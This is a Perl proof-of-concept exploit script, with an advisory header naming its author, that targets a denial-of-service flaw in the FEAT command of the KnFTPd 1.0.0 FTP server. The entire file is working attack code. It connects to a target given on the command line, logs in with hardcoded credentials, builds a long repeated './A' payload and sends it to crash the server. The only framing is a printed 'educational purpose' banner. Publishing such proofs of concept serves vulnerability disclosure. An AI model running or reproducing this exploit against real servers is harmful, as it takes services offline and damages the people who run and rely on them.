#!/usr/bin/perl
#################################################################################
# Advisory: KnFTPd 1.0.0 'FEAT' DoS PoC-Exploit
# Author: Stefan Schurtz
# Affected Software: Successfully tested on KnFTPd 1.0.0
# Vendor URL: http://knftp.sourceforge.net/
# Vendor Status: informed
# CVE-ID: -
# PoC-Version: 1.0
#################################################################################
use strict;
use Net::FTP;

my $user = "system";
my $password = "secret";

########################
# connect
########################
my $target = $ARGV[0];
my $plength = $ARGV[1];

print "\n";
print "\t#######################################################\n";
print "\t# This PoC-Exploit is only for educational purpose!!! #\n";
print "\t#######################################################\n";
print "\n";

if (!$ARGV[0]||!$ARGV[1]) {
	print "[+] Usage: $@ <target> <payload length>\n";
	exit 1;
}

my $ftp=Net::FTP->new($target,Timeout=>12) or die "Cannot connect to $target: $@";
print "[+] Connected to $target\n";

########################
# login
########################
$ftp->login($user,$password) or die "Cannot login ", $ftp->message;
print "[+] Logged in with user $user\n";

###################################################
# Building payload './A' with min. length of 94
##################################################
my @p = ( "","./A" );
my $payload;

print "[+] Building payload\n";

for (my $i=1;$i<=$plength;$i++) {
	 $payload .= $p[$i];
	 push(@p,$p[$i]);
}
sleep(3);

#########################################
# Sending payload
#########################################
print "[+] Sending payload [$payload]\n";
$ftp->quot('FEAT ' ."$payload");

##########################################
# disconnect
##########################################
print "[+] Done\n";
$ftp->quit;
exit 0;
#EOF 